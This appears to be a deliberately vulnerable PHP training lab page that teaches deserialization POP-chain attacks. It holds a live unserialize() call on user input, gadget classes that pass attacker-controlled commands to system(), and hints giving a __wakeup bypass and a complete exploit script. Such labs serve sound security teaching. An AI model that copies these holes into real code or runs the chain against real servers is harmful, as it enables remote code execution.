<?php

class Vuln5POPChain {
    private $user;
    private $admin = false;
    
    public function __construct($username) {
        $this->user = $username;
    }
    
    public function __destruct() {
        if ($this->admin) {
            $this->executeAdminCommand();
        }
    }
    
    private function executeAdminCommand() {
        $cmd = $_POST['admin_cmd'] ?? 'whoami';
        system($cmd);
    }
    
    public function __wakeup() {
        $this->admin = false;
    }
    
    public function __toString() {
        return "User: {$this->user}, Admin: " . ($this->admin ? 'true' : 'false');
    }
}

class CommandExecutor {
    private $command;
    private $args;
    
    public function __construct($command, $args = []) {
        $this->command = $command;
        $this->args = $args;
    }
    
    public function __invoke() {
        array_unshift($this->args, $this->command);
        return call_user_func_array('system', $this->args);
    }
}

class Logger {
    private $logFile;
    private $callback;
    
    public function __construct($logFile, $callback) {
        $this->logFile = $logFile;
        $this->callback = $callback;
    }
    
    public function __destruct() {
        if ($this->callback instanceof CommandExecutor) {
            $message = ($this->callback)();
            file_put_contents($this->logFile, $message, FILE_APPEND);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST['data'];
    
    try {
        $obj = unserialize(base64_decode($data));
        echo "反序列化成功！<br>";
        echo "对象: " . $obj . "<br>";
    } catch (Exception $e) {
        echo "反序列化失败: " . $e->getMessage() . "<br>";
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP反序列化POP链漏洞</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; margin-bottom: 20px; }
        .header h1 { margin-bottom: 10px; }
        .vuln-info { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .risk-badge { display: inline-block; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; background: #ffbb33; color: white; }
        .test-area { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
        .form-group textarea { width: 100%; min-height: 100px; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
        button { background: #667eea; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
        .hint-section { background: #fff3cd; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .hint-btn { background: #ffc107; color: #333; margin-right: 10px; margin-bottom: 10px; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        .hint-content { display: none; background: white; padding: 15px; margin-top: 10px; border-radius: 5px; border-left: 4px solid #ffc107; }
        .hint-content pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; }
        .result { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; }
        .nav { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
        .nav a { padding: 10px 20px; background: white; color: #666; text-decoration: none; border-radius: 5px; }
        .nav a:hover, .nav a.active { background: #667eea; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>PHP反序列化POP链漏洞</h1>
            <p>通过魔术方法链构造POP链实现远程代码执行</p>
        </div>

        <div class="nav">
            <a href="/index.html">返回首页</a>
            <a href="/vuln5.php" class="active">PHP反序列化POP链</a>
            <a href="/vuln6.php">PHP Phar反序列化</a>
        </div>

        <div class="vuln-info">
            <h2>漏洞信息</h2>
            <p><strong>描述：</strong> 通过构造POP链，利用多个类的魔术方法触发恶意代码执行</p>
            <p><strong>危险等级：</strong> <span class="risk-badge">中危</span></p>
            <p><strong>学习目标：</strong> 理解POP链构造原理，掌握__destruct、__wakeup、__toString等魔术方法的利用</p>
        </div>

        <div class="test-area">
            <h3>漏洞测试区</h3>
            <form method="POST">
                <div class="form-group">
                    <label>提交序列化数据（Base64编码）：</label>
                    <textarea name="data" placeholder="在这里输入你的序列化payload（Base64编码）..."></textarea>
                </div>
                <button type="submit">提交测试</button>
            </form>
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <div class="result">
                <strong>执行结果：</strong><br>
                <?php if (isset($obj)): ?>
                    <?php echo $obj; ?>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>

        <div class="hint-section">
            <h3>提示系统</h3>
            <button class="hint-btn" onclick="showHint(1)">提示1：POP链思路</button>
            <button class="hint-btn" onclick="showHint(2)">提示2：绕过__wakeup</button>
            <button class="hint-btn" onclick="showHint(3)">提示3：完整利用链</button>
            
            <div id="hint1" class="hint-content">
                <h4>POP链思路</h4>
                <p>POP链（Property-Oriented Programming）通过组合多个类的属性和方法，形成调用链。关键在于找到可控的触发点。</p>
            </div>
            
            <div id="hint2" class="hint-content">
                <h4>绕过__wakeup</h4>
                <p>在PHP 7.1.x及以下版本，可以通过修改序列化字符串中对象属性的数量来绕过__wakeup方法。</p>
                <pre><code>O:12:"Vuln5POPChain":2:{...}
改为：
O:12:"Vuln5POPChain":3:{...}</code></pre>
            </div>
            
            <div id="hint3" class="hint-content">
                <h4>完整利用链</h4>
                <pre><code>&lt;?php
class CommandExecutor {
    private $command = "touch /tmp/pwned";
    private $args = [];
}

class Logger {
    private $logFile = "/tmp/log.txt";
    private $callback;
    
    public function __construct() {
        $this->callback = new CommandExecutor();
    }
}

$obj = new Logger();
echo base64_encode(serialize($obj));
?&gt;</code></pre>
            </div>
        </div>
    </div>

    <script>
        function showHint(level) {
            var hint = document.getElementById('hint' + level);
            if (hint.style.display === 'block') {
                hint.style.display = 'none';
            } else {
                hint.style.display = 'block';
            }
        }
    </script>
</body>
</html>
